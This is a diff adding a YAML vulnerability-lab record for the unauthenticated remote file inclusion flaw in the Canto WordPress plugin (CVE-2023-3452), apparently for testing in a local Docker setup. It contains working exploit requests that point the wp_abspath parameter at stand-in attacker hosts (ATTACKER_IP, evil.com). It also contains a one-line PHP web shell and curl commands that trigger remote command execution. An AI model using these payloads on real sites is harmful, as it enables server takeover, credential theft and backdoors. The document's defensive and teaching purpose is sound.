@@ -1,0 +1,140 @@
+id: vt-2023-3452
+
+info:
+  name: "WordPress Canto Plugin Unauthenticated Remote File Inclusion (CVE-2023-3452)"
+  author: omarkurt
+  description: |
+    The Canto plugin for WordPress is vulnerable to Remote File Inclusion
+    in all versions up to, and including, 3.0.4 via the 'wp_abspath' parameter.
+    This makes it possible for unauthenticated attackers to include and execute
+    arbitrary remote code on the server, provided that allow_url_include is enabled.
+  targets:
+    - wordpress
+    - canto
+  type: CVE
+  cve: CVE-2023-3452
+  cwe: CWE-98
+  cvss:
+    score: 9.8
+    severity: critical
+  affected_versions:
+    - "<= 3.0.4"
+  fixed_version: "3.0.5"
+  tags:
+    - rfi
+    - rce
+    - unauthenticated
+    - wordpress
+    - plugin
+    - canto
+
+owasp:
+  - "A03:2021 - Injection"
+
+vulnerabilities:
+  - id: rfi-rce
+    name: "Unauthenticated RFI via wp_abspath parameter"
+    endpoint: /wp-content/plugins/canto/includes/lib/download.php
+    method: GET
+    param: wp_abspath
+    authentication:
+      type: none
+      required: false
+
+    request: |
+      GET /wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://ATTACKER_IP:PORT HTTP/1.1
+      Host: {{target}}:8022
+
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: text/html; charset=UTF-8
+
+    payloads:
+      - name: "Remote File Inclusion"
+        value: "http://ATTACKER:8080"
+        note: "Attacker must host /wp-admin/admin.php with malicious PHP code"
+
+      - name: "RCE via cmd parameter"
+        value: "http://ATTACKER:8080&cmd=id"
+        expected_output: "uid=33(www-data)"
+
+    indicators:
+      success:
+        - "uid="
+        - "www-data"
+      failure:
+        - "require_once(): Failed opening"
+        - "allow_url_include"
+
+technical: |
+  The vulnerability exists in the file:
+  wp-content/plugins/canto/includes/lib/download.php
+
+  Vulnerable code:
+    require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php');
+
+  The 'wp_abspath' parameter is taken directly from user input ($_REQUEST)
+  without any validation or sanitization. When allow_url_include is enabled
+  in PHP configuration, an attacker can supply a remote URL as the value
+  of wp_abspath. PHP will then fetch and execute the remote file.
+
+  The plugin appends '/wp-admin/admin.php' to the attacker-controlled URL,
+  so the attacker must host a file at that path on their server containing
+  arbitrary PHP code (e.g., system($_GET['cmd'])).
+
+  Attack Flow:
+  1. Attacker hosts malicious admin.php on their server (e.g., http://evil.com/wp-admin/admin.php)
+  2. Attacker sends GET request to vulnerable endpoint with wp_abspath=http://evil.com
+  3. Server executes: require_once('http://evil.com/wp-admin/admin.php')
+  4. Malicious PHP code runs on the target server as www-data
+
+impact: |
+  - Full Remote Code Execution without authentication
+  - Complete server compromise
+  - Access to WordPress database credentials
+  - Lateral movement to other services on the server
+  - Data exfiltration (posts, users, passwords)
+  - Defacement or backdoor installation
+  - CVSS 9.8 Critical - Network accessible, no privileges required
+
+remedy: |
+  1. Update Canto plugin to version 3.0.5 or later
+  2. Disable allow_url_include in php.ini (allow_url_include = Off)
+  3. Remove the Canto plugin if not actively used
+  4. Implement WAF rules to block RFI patterns in URL parameters
+
+references:
+  - "https://nvd.nist.gov/vuln/detail/CVE-2023-3452"
+  - "https://www.exploit-db.com/exploits/51826"
+  - "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/canto/canto-304-unauthenticated-remote-file-inclusion"
+  - "https://github.com/leoanggal1/CVE-2023-3452-PoC"
+  - "https://patchstack.com/database/wordpress/plugin/canto/vulnerability/wordpress-canto-plugin-3-0-4-unauthenticated-remote-file-inclusion-vulnerability"
+
+poc:
+  nuclei:
+    - "vt-2023-3452.nuclei.yaml"
+  manual:
+    steps:
+      - "1. docker-compose up -d --build"
+      - "2. Complete WordPress setup at http://localhost:8022/"
+      - "3. Activate Canto plugin in wp-admin"
+      - "4. Start attacker server: mkdir -p /tmp/wp-admin && echo '<?php system($_GET[\"cmd\"]); ?>' > /tmp/wp-admin/admin.php && cd /tmp && python3 -m http.server 9090"
+      - "5. Trigger RFI: curl 'http://localhost:8022/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://HOST_IP:9090&cmd=id'"
+  curl_examples:
+    - name: "Check vulnerable endpoint exists"
+      command: |
+        curl -s -o /dev/null -w "%{http_code}" http://localhost:8022/wp-content/plugins/canto/includes/lib/download.php
+
+    - name: "Trigger RFI with command execution"
+      command: |
+        curl -s "http://localhost:8022/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://ATTACKER_IP:9090&cmd=id"
+
+providers:
+  docker-compose:
+    path: "docker-compose.yaml"
+    port: 8022
+
+metadata:
+  created: "2026-02-17"
+  updated: "2026-02-17"
+  version: "1.0.0"
